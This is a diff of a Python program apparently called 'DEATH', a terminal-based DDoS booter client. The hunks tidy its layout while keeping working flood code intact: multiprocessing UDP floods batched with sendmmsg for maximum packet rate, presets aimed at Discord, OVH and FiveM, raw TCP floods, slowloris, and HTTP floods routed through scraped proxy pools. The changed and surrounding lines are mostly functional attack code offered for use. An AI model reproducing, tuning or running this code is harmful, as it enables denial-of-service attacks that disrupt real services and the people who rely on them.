@@ -2,8 +2,12 @@
 # ============================================================
 #  DEATH — terminal stress client (ssh-stable, high-throughput)
 # ============================================================
-#  UDP attack paths use multiprocessing + sendmmsg batching
-#  for real throughput on low-CPU containers.
+#  - raw pty mode enforced (stty + termios)
+#  - escape-sequence drain in input handler
+#  - left-aligned layout (no more centering wrap)
+#  - capped layout width (200 cols max)
+#  - UDP attacks use multiprocessing + sendmmsg batching
+#  - scrape intact, workers tuned for 0.1 CPU
 # ============================================================
 
 import os
@@ -80,7 +84,7 @@ def restore_tty():
         pass
 
 # ============================================================
-#  SENMmsg BATCHING VIA ctypes  (linux)
+#  SENDMMSG BATCHING VIA ctypes (linux only)
 # ============================================================
 
 LIBC = None
@@ -280,7 +284,10 @@ PROXY_RE_SIMPLE = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})")
 #  TERMINAL SIZE
 # ============================================================
 
+LAYOUT_MAX_COLS = 200
+
 def term_size() -> Tuple[int, int]:
+    """Real terminal size."""
     try:
         sz = os.get_terminal_size(sys.stdout.fileno())
         cols, rows = sz.columns, sz.lines
@@ -294,6 +301,12 @@ def term_size() -> Tuple[int, int]:
         return sz.columns, sz.lines
     except Exception:
         return 80, 24
+
+def layout_cols() -> int:
+    """Capped column count for layout math. Prevents centering-based wrap
+    on super-wide terminals."""
+    cols, _ = term_size()
+    return min(cols, LAYOUT_MAX_COLS)
 
 # ============================================================
 #  USERS
@@ -446,13 +459,6 @@ def visible_len(s):
             out += 1
             i += 1
     return out
-
-def center_visible(s, width):
-    vl = visible_len(s)
-    if vl >= width:
-        return s
-    pad = (width - vl) // 2
-    return " " * pad + s
 
 def emblem_static(theme):
     ar, ag, ab = theme["accent"]
@@ -774,25 +780,15 @@ def scrape_and_validate(on_progress, stop):
     return alive
 
 # ============================================================
-#  HIGH-THROUGHPUT UDP ATTACK WORKERS (multiprocessing)
-# ============================================================
-#  Each worker runs in its own process — bypasses the GIL.
-#  On linux we use sendmmsg to batch up to BATCH packets per
-#  syscall. This is the difference between hundreds of packets
-#  per second and tens of thousands.
+#  HIGH-THROUGHPUT UDP WORKERS (multiprocessing + sendmmsg)
 # ============================================================
 
-UDP_BATCH = 64           # datagrams per sendmmsg call
-UDP_PAYLOAD = 1400       # bytes per datagram (near MTU)
+UDP_BATCH = 64
+UDP_PAYLOAD = 1400
 
 def _udp_worker_process(host_ip: str, port: int, stop_flag, sent_counter, failed_counter,
                         payload_mode: str):
-    """
-    payload_mode: 'random' | 'small' | 'rtp' | 'stun_mix'
-    Runs in its own process. Fires UDP datagrams at (host_ip, port) at max rate.
-    Uses sendmmsg batching when available.
-    """
-    # build payload pool
+    """Runs in its own process — bypasses GIL. Uses sendmmsg when available."""
     if payload_mode == "small":
         payloads = [os.urandom(random.randint(64, 256)) for _ in range(32)]
     elif payload_mode == "rtp":
@@ -823,7 +819,6 @@ def _udp_worker_process(host_ip: str, port: int, stop_flag, sent_counter, failed
     else:
         payloads = [os.urandom(UDP_PAYLOAD) for _ in range(16)]
 
-    # one socket per process, aggressive send buffer
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 << 20)
@@ -833,7 +828,6 @@ def _udp_worker_process(host_ip: str, port: int, stop_flag, sent_counter, failed
 
     target = (host_ip, port)
 
-    # try sendmmsg batching path first
     if SENDMMSG is not None:
         _udp_sendmmsg_loop(s, target, payloads, stop_flag, sent_counter, failed_counter)
     else:
@@ -852,18 +846,14 @@ def _udp_sendto_loop(sock, target, payloads, stop_flag, sent_counter, failed_cou
             with sent_counter.get_lock():
                 sent_counter.value += 1
         except BlockingIOError:
-            # send buffer full — this is FINE, just means we're faster
-            # than the NIC. skip and retry. do NOT count as failure.
             pass
         except Exception:
             with failed_counter.get_lock():
                 failed_counter.value += 1
 
 def _udp_sendmmsg_loop(sock, target, payloads, stop_flag, sent_counter, failed_counter):
-    """Batch UDP sends using sendmmsg — up to UDP_BATCH per syscall."""
     fd = sock.fileno()
 
-    # pre-build the target sockaddr_in once
     class SockAddrIn(ctypes.Structure):
         _fields_ = [
             ("sin_family", ctypes.c_ushort),
@@ -881,13 +871,11 @@ def _udp_sendmmsg_loop(sock, target, payloads, stop_flag, sent_counter, failed_c
 
     n_payloads = len(payloads)
 
-    # pre-allocate ctypes buffers for each payload slot (we rotate through)
     payload_bufs = []
     for p in payloads:
         buf = ctypes.create_string_buffer(p, len(p))
         payload_bufs.append((buf, len(p)))
 
-    # build the msgvec once, reuse across calls
     mmsg_array = (MMsgHdr * UDP_BATCH)()
     iovec_arrays = []
     for i in range(UDP_BATCH):
@@ -905,7 +893,6 @@ def _udp_sendmmsg_loop(sock, target, payloads, stop_flag, sent_counter, failed_c
     mmsg_ptr = ctypes.cast(mmsg_array, ctypes.c_void_p)
 
     while not stop_flag.value:
-        # fill the batch
         for i in range(UDP_BATCH):
             idx = random.randrange(n_payloads)
             buf, blen = payload_bufs[idx]
@@ -919,7 +906,6 @@ def _udp_sendmmsg_loop(sock, target, payloads, stop_flag, sent_counter, failed_c
                     sent_counter.value += n
             elif n < 0:
                 errno_val = ctypes.get_errno()
-                # EAGAIN/EWOULDBLOCK = buffer full, that's fine
                 if errno_val not in (11, 35):
                     with failed_counter.get_lock():
                         failed_counter.value += 1
@@ -928,7 +914,7 @@ def _udp_sendmmsg_loop(sock, target, payloads, stop_flag, sent_counter, failed_c
                 failed_counter.value += 1
 
 # ============================================================
-#  RAW TCP FLOOD (threaded — IO-bound)
+#  TCP WORKERS
 # ============================================================
 
 def raw_tcp_socket_flood(host, port, stop, stats):
@@ -954,10 +940,6 @@ def raw_tcp_socket_flood(host, port, stop, stats):
             stats["sent"] = stats.get("sent", 0) + 1
         except Exception:
             stats["failed"] = stats.get("failed", 0) + 1
-
-# ============================================================
-#  SLOWLORIS + PROXY HTTP WORKERS
-# ============================================================
 
 def build_request(method, host, port, path="/"):
     scheme = "https" if (method in ("tls", "https", "browser", "slowloris", "http2") or port == 443) else "http"
@@ -1183,12 +1165,10 @@ def _attack_inner(method, host, port, duration):
     threads = []
     processes = []
 
-    # shared counters for multiprocessing workers
     mp_sent = mp.Value("l", 0)
     mp_failed = mp.Value("l", 0)
     mp_stop = mp.Value("i", 0)
 
-    # thread-side stats for TCP/L7 paths
     tstats = {"sent": 0, "failed": 0}
     dead_proxies = set()
     dead_lock = threading.Lock()
@@ -1209,14 +1189,12 @@ def _attack_inner(method, host, port, duration):
             except Exception:
                 pass
 
-    # ---- UDP paths: multiprocessing + sendmmsg ----
     if method in ("udp", "pps", "hold", "discord"):
         if ip is None:
             S.log_line("attack aborted — dns failed")
             S.dirty = True
             return
 
-        # 4 processes on 0.1 CPU is the sweet spot. more = context switching.
         n_procs = 4
 
         if method == "udp":
@@ -1228,9 +1206,8 @@ def _attack_inner(method, host, port, duration):
         elif method == "hold":
             payload_mode = "random"
             target_port = port
-        else:  # discord
+        else:
             payload_mode = "stun_mix"
-            # discord: port range 50000-65535 if not in range
             target_port = port
 
         for _ in range(n_procs):
@@ -1242,7 +1219,6 @@ def _attack_inner(method, host, port, duration):
             p.start()
             processes.append(p)
 
-    # ---- TCP paths ----
     elif method in ("tcp", "ovh", "fiveM", "socket"):
         if pool:
             spawn_thread(proxy_http_worker, min(max(len(pool) * 2, 32), 128),
@@ -1253,7 +1229,6 @@ def _attack_inner(method, host, port, duration):
     elif method == "slowloris":
         spawn_thread(slowloris_worker, 24, lambda: (host, port, stop, tstats))
 
-    # ---- L7 paths ----
     else:
         if pool:
             spawn_thread(proxy_http_worker, min(max(len(pool) * 2, 48), 256),
@@ -1264,17 +1239,13 @@ def _attack_inner(method, host, port, duration):
                          lambda: (method, host, port, pool, pool_lock, stop, tstats,
                                   fail_counts, fail_lock, dead_proxies, dead_lock, True))
 
-    # ---- run loop ----
     start = time.time()
-    last_display = 0.0
     while not stop.is_set():
         elapsed = time.time() - start
         remaining = max(0, duration - int(elapsed))
 
-        # read multiprocessing counters
         mp_sent_val = mp_sent.value
         mp_failed_val = mp_failed.value
-
         total_sent = mp_sent_val + tstats["sent"]
         total_failed = mp_failed_val + tstats["failed"]
 
@@ -1289,7 +1260,6 @@ def _attack_inner(method, host, port, duration):
             break
         time.sleep(0.2)
 
-    # signal everything to stop
     stop.set()
     mp_stop.value = 1
 
@@ -1324,38 +1294,24 @@ def _attack_inner(method, host, port, duration):
     time.sleep(0.4)
 
 # ============================================================
-#  RENDERERS
+#  RENDERERS — left-aligned, capped width
 # ============================================================
 
 def render_banner():
     theme = S.theme
-    cols, _ = term_size()
     banner_lines = BANNER_DEATH.split("\n")
-    banner_w = max(len(l) for l in banner_lines)
-    if cols <= banner_w + 4:
-        pad = 0
-    else:
-        pad = (cols - banner_w) // 2
     out = ["\n"]
     for line in banner_lines:
-        out.append(" " * pad + gradient_static(line, theme) + "\n")
+        out.append("  " + gradient_static(line, theme) + "\n")
     return "".join(out)
 
-def render_prompt(frame):
-    theme = S.theme
+def render_prompt_cell():
     _, rows = term_size()
-    blink = (frame // 4) % 2 == 0
-    cursor = solid("█", theme, "accent") if blink else " "
-    user = solid(S.username or "guest", theme, "accent")
-    sep = solid("●", theme, "accent")
-    brand = solid("death", theme, "accent")
-    arrow = solid("►", theme, "accent")
-    line = f"{user}{sep}{brand}{arrow} {S.input_buffer}{cursor}"
-    return move(rows, 1) + clear_line() + line
+    return move(rows, 1) + clear_line()
 
 def render_attack_screen(frame):
     theme = S.theme
-    cols, _ = term_size()
+    cols = layout_cols()
     a = S.attack_screen
     if a is None:
         return ""
@@ -1363,7 +1319,7 @@ def render_attack_screen(frame):
     out = [HOME, CLEAR]
     header = "D E A T H   |   A T T A C K I N G"
     out.append("\n")
-    out.append(center_visible(gradient_static(header, theme), cols) + "\n")
+    out.append("  " + gradient_static(header, theme) + "\n")
     out.append("\n")
 
     emblem_lines = emblem_static(theme)
@@ -1392,7 +1348,7 @@ def render_attack_screen(frame):
     mid.append("Country : " + solid(str(a["info"]["country"]), theme, "accent"))
 
     mid_w = max(visible_len(x) for x in mid) if mid else 0
-    left_pad = 6
+    left_pad = 4
     side_by_side_width = left_pad + emblem_w + gap + mid_w + gap + emblem_w
     if cols < side_by_side_width:
         for l in emblem_lines:
@@ -1413,7 +1369,7 @@ def render_attack_screen(frame):
 
 def render_home():
     theme = S.theme
-    cols, _ = term_size()
+    cols = layout_cols()
     out = []
     emblem_lines = emblem_static(theme)
     emblem_w = max(len(l) for l in EMBLEM.split("\n"))
@@ -1910,7 +1866,6 @@ def prompt_input(row: int, label: str, mask: bool) -> Optional[str]:
 
 def login_screen() -> bool:
     theme = S.theme
-    cols, rows = term_size()
 
     sys.stdout.write(CLEAR + HOME)
     banner = render_banner()
@@ -1920,16 +1875,16 @@ def login_screen() -> bool:
 
     title_row = banner_rows + 2
     sys.stdout.write(move(title_row, 1) + clear_line()
-                     + center_visible(solid("login", theme, "accent"), cols))
+                     + "  " + solid("login", theme, "accent"))
     sys.stdout.flush()
 
     user_row = title_row + 2
     pass_row = user_row + 1
 
-    username = prompt_input(user_row, "username: ", mask=False)
+    username = prompt_input(user_row, "  username: ", mask=False)
     if username is None:
         return False
-    password = prompt_input(pass_row, "password: ", mask=True)
+    password = prompt_input(pass_row, "  password: ", mask=True)
     if password is None:
         return False
 
@@ -1940,7 +1895,7 @@ def login_screen() -> bool:
         return True
 
     sys.stdout.write(move(pass_row + 2, 1) + clear_line()
-                     + center_visible(solid("access denied", theme, "accent"), cols))
+                     + "  " + solid("access denied", theme, "accent"))
     sys.stdout.flush()
     time.sleep(1.5)
     return login_screen()
@@ -2047,5 +2002,8 @@ def main():
         sys.stdout.flush()
 
 if __name__ == "__main__":
-    mp.set_start_method("fork", force=True)
+    try:
+        mp.set_start_method("fork", force=True)
+    except Exception:
+        pass
     main()
